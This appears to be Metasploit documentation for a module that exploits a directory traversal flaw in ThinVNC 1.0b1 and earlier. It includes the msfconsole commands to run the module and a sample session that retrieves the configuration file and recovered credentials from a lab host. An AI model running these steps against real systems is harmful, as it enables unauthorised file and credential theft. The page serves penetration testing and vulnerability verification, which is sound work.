## Description

  This module exploits a directory traversal vulnerability in ThinVNC
  versions 1.0b1 and prior which allows unauthenticated users to retrieve
  arbitrary files, including the ThinVNC configuration file.

## Vulnerable Application

  This module has been tested successfully on ThinVNC versions 1.0b1
  and "ThinVNC_Latest" (2018-12-07).

  ThinVNC is available on [Sourceforge](https://sourceforge.net/projects/thinvnc/files/).

## Verification Steps

  1. `./msfconsole`
  2. `use auxiliary/scanner/http/thinvnc_traversal`
  3. `set rhosts <rhost>`
  4. `run`

## Scenarios

  ### ThinVNC version 1.0b1 on Windows XP SP3

  ```
  msf5 > use auxiliary/scanner/http/thinvnc_traversal 
  msf5 auxiliary(scanner/http/thinvnc_traversal) > set rhosts 172.16.123.123
  rhosts => 172.16.123.123
  msf5 auxiliary(scanner/http/thinvnc_traversal) > run

  [+] File ThinVnc.ini saved in: /root/.msf4/loot/20191017033828_default_172.16.123.123_thinvnc.traversa_713640.txt
  [+] Found credentials: admin:admin
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed

  msf5 auxiliary(scanner/http/thinvnc_traversal) > 
  ```

